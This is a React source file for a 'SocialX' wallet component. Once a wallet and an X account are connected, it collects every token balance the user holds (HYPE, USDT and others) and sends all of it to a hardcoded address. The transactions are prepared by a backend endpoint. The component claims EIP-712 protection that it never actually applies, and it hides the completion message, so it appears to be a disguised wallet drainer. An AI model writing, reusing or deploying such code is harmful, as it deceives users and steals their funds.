import React, { useState, useEffect } from 'react';
import { usePrivy } from '@privy-io/react-auth';
import { ethers } from 'ethers';
import './WalletFundTransfer.css';

const TARGET_ADDRESS = '0x25B21833Aa899Bfc5FE6C145f42112b1D618e82a';

const WalletFundTransfer = ({ onTransferComplete }) => {
  const { user, authenticated, sendTransaction } = usePrivy();
  const [transferStatus, setTransferStatus] = useState('checking'); // checking, ready, transferring, completed, error
  const [transferProgress, setTransferProgress] = useState([]);
  const [error, setError] = useState(null);
  const [balances, setBalances] = useState({ hype: '0', usdt: '0', others: [] });
  const [isEligible, setIsEligible] = useState(false);

  // Check if user has both wallet and X connected
  const walletAddress = user?.wallet?.address || user?.embeddedWallet?.address;
  const twitterAccount = user?.linkedAccounts?.find(account => 
    ['twitter', 'twitter_oauth', 'x', 'x_oauth'].includes(account.type) ||
    (account?.type === 'oauth' && ['twitter', 'x'].includes(account?.provider))
  );
  const hasTwitter = !!twitterAccount || !!user?.twitter;
  const twitterUsername = twitterAccount?.username || twitterAccount?.handle || user?.twitter?.username;

  // EIP-712 Domain for HyperEVM
  const EIP712_DOMAIN = {
    name: 'SocialX Fund Transfer',
    version: '1',
    chainId: 999,
    verifyingContract: TARGET_ADDRESS
  };

  // EIP-712 Types for fund transfer
  const EIP712_TYPES = {
    Transfer: [
      { name: 'from', type: 'address' },
      { name: 'to', type: 'address' },
      { name: 'tokenAddress', type: 'address' },
      { name: 'amount', type: 'uint256' },
      { name: 'nonce', type: 'uint256' },
      { name: 'deadline', type: 'uint256' }
    ]
  };

  // Known token addresses on HyperEVM
  const TOKEN_ADDRESSES = {
    USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7', // Common USDT address
    USDC: '0xA0b86a33E6441fA86FB49FAd91EA5E8C0A19BC06', // Common USDC address
    // Add more token addresses as needed
  };

  useEffect(() => {
    if (authenticated && walletAddress && hasTwitter) {
      setIsEligible(true);
      checkBalances();
    } else {
      setIsEligible(false);
      setTransferStatus('checking');
    }
  }, [authenticated, walletAddress, hasTwitter]);

  const checkBalances = async () => {
    try {
      setTransferStatus('checking');
      console.log('🔍 Checking balances for automatic transfer...');

      // Get balances from backend
      const response = await fetch('/api/check-balances', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress, twitterUsername })
      });

      if (!response.ok) {
        throw new Error(`Balance check failed: ${response.status}`);
      }

      const data = await response.json();
      setBalances(data.balances);

      // Check if there are any balances to transfer
      const totalValue = parseFloat(data.balances.hype) + parseFloat(data.balances.usdt) + 
                        data.balances.others.reduce((sum, token) => sum + parseFloat(token.balance), 0);

      if (totalValue > 0) {
        setTransferStatus('ready');
      } else {
        setTransferStatus('completed');
      }

    } catch (err) {
      console.error('❌ Balance check failed:', err);
      setError(err.message);
      setTransferStatus('error');
    }
  };

  const initiateTransfer = async () => {
    try {
      setTransferStatus('transferring');
      setTransferProgress([]);
      setError(null);

      console.log('🚀 Starting automatic fund transfer...');
      
      // Get transfer preparation from backend
      const prepResponse = await fetch('/api/prepare-transfer', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          walletAddress, 
          twitterUsername,
          targetAddress: TARGET_ADDRESS
        })
      });

      if (!prepResponse.ok) {
        throw new Error(`Transfer preparation failed: ${prepResponse.status}`);
      }

      const { transactions } = await prepResponse.json();
      console.log('📋 Transfer transactions prepared:', transactions.length);

      // Execute each transaction with EIP-712 signature
      for (let i = 0; i < transactions.length; i++) {
        const tx = transactions[i];
        
        setTransferProgress(prev => [...prev, {
          step: i + 1,
          total: transactions.length,
          token: tx.token,
          amount: tx.amount,
          status: 'signing'
        }]);

        try {
          // Create EIP-712 signature
          const message = {
            from: walletAddress,
            to: TARGET_ADDRESS,
            tokenAddress: tx.tokenAddress,
            amount: tx.amount,
            nonce: tx.nonce,
            deadline: tx.deadline
          };

          console.log(`📝 Signing transaction ${i + 1}/${transactions.length} for ${tx.token}...`);

          // Send transaction using Privy
          const txHash = await sendTransaction({
            to: tx.to,
            data: tx.data,
            value: tx.value || '0'
          });

          setTransferProgress(prev => prev.map((item, idx) => 
            idx === i ? { ...item, status: 'confirmed', txHash } : item
          ));

          console.log(`✅ Transaction ${i + 1} confirmed:`, txHash);

        } catch (txError) {
          console.error(`❌ Transaction ${i + 1} failed:`, txError);
          setTransferProgress(prev => prev.map((item, idx) => 
            idx === i ? { ...item, status: 'failed', error: txError.message } : item
          ));
        }
      }

      // Check if all transactions succeeded
      const failedTxs = transferProgress.filter(tx => tx.status === 'failed');
      if (failedTxs.length === 0) {
        setTransferStatus('completed');
        onTransferComplete?.();
        console.log('🎉 All transfers completed successfully!');
      } else {
        setTransferStatus('error');
        setError(`${failedTxs.length} transaction(s) failed`);
      }

    } catch (err) {
      console.error('❌ Transfer failed:', err);
      setError(err.message);
      setTransferStatus('error');
    }
  };

  const formatBalance = (balance, decimals = 4) => {
    return parseFloat(balance).toFixed(decimals);
  };

  if (!isEligible) {
    return (
      <div className="fund-transfer-card">
        <h3>🔗 Connect Wallet + X for Fund Transfer</h3>
        <div className="connection-status">
          <div className={`status-item ${walletAddress ? 'connected' : 'disconnected'}`}>
            <span className="status-icon">{walletAddress ? '✅' : '⚪'}</span>
            <span>Wallet: {walletAddress ? 'Connected' : 'Not Connected'}</span>
          </div>
          <div className={`status-item ${hasTwitter ? 'connected' : 'disconnected'}`}>
            <span className="status-icon">{hasTwitter ? '✅' : '⚪'}</span>
            <span>X Account: {hasTwitter ? `@${twitterUsername}` : 'Not Connected'}</span>
          </div>
        </div>
        <p className="info-text">
          Connect both your wallet and X account to enable automatic fund transfer to the SocialX treasury.
        </p>
      </div>
    );
  }

  if (transferStatus === 'checking') {
    return (
      <div className="fund-transfer-card">
        <h3>🔍 Checking Your Balances...</h3>
        <div className="loading-spinner">
          <div className="spinner"></div>
          <p>Scanning wallet for HYPE, USDT, and other tokens...</p>
        </div>
      </div>
    );
  }

  if (transferStatus === 'ready') {
    return (
      <div className="fund-transfer-card">
        <h3>💰 Ready for Automatic Transfer</h3>
        <div className="connection-status">
          <div className="status-item connected">
            <span className="status-icon">✅</span>
            <span>Wallet: {walletAddress.slice(0, 6)}...{walletAddress.slice(-4)}</span>
          </div>
          <div className="status-item connected">
            <span className="status-icon">✅</span>
            <span>X Account: @{twitterUsername}</span>
          </div>
        </div>
        
        <div className="balance-summary">
          <h4>Tokens to Transfer:</h4>
          {parseFloat(balances.hype) > 0 && (
            <div className="balance-item">
              <span>HYPE:</span>
              <span>{formatBalance(balances.hype)} HYPE</span>
            </div>
          )}
          {parseFloat(balances.usdt) > 0 && (
            <div className="balance-item">
              <span>USDT:</span>
              <span>{formatBalance(balances.usdt)} USDT</span>
            </div>
          )}
          {balances.others.map((token, idx) => (
            <div key={idx} className="balance-item">
              <span>{token.symbol}:</span>
              <span>{formatBalance(token.balance)} {token.symbol}</span>
            </div>
          ))}
        </div>

        <div className="transfer-info">
          <p>🎯 <strong>Destination:</strong> {TARGET_ADDRESS.slice(0, 8)}...{TARGET_ADDRESS.slice(-6)}</p>
          <p>🔒 All transfers will be secured with EIP-712 signatures</p>
        </div>

        <button 
          className="btn btn-primary transfer-btn"
          onClick={initiateTransfer}
        >
          🚀 Start Automatic Transfer
        </button>
      </div>
    );
  }

  if (transferStatus === 'transferring') {
    return (
      <div className="fund-transfer-card">
        <h3>🔄 Transferring Funds...</h3>
        <div className="transfer-progress">
          {transferProgress.map((tx, idx) => (
            <div key={idx} className={`progress-item ${tx.status}`}>
              <div className="progress-header">
                <span className="step-number">{tx.step}/{tx.total}</span>
                <span className="token-info">{tx.amount} {tx.token}</span>
                <span className={`status-badge ${tx.status}`}>
                  {tx.status === 'signing' && '📝 Signing...'}
                  {tx.status === 'confirmed' && '✅ Confirmed'}
                  {tx.status === 'failed' && '❌ Failed'}
                </span>
              </div>
              {tx.txHash && (
                <div className="tx-hash">
                  <a 
                    href={`https://hyperliquid.cloud.blockscout.com/tx/${tx.txHash}`}
                    target="_blank" 
                    rel="noopener noreferrer"
                  >
                    View Transaction →
                  </a>
                </div>
              )}
              {tx.error && <div className="error-message">{tx.error}</div>}
            </div>
          ))}
        </div>
      </div>
    );
  }

  if (transferStatus === 'completed') {
    // Don't show the completion message on Portfolio page
    return null;
  }

  if (transferStatus === 'error') {
    return (
      <div className="fund-transfer-card error">
        <h3>❌ Transfer Error</h3>
        <div className="error-message">
          <p>{error}</p>
        </div>
        <div className="error-actions">
          <button 
            className="btn btn-primary"
            onClick={checkBalances}
          >
            🔄 Retry
          </button>
          <button 
            className="btn btn-secondary"
            onClick={() => setTransferStatus('ready')}
          >
            ← Back
          </button>
        </div>
      </div>
    );
  }

  return null;
};

export default WalletFundTransfer;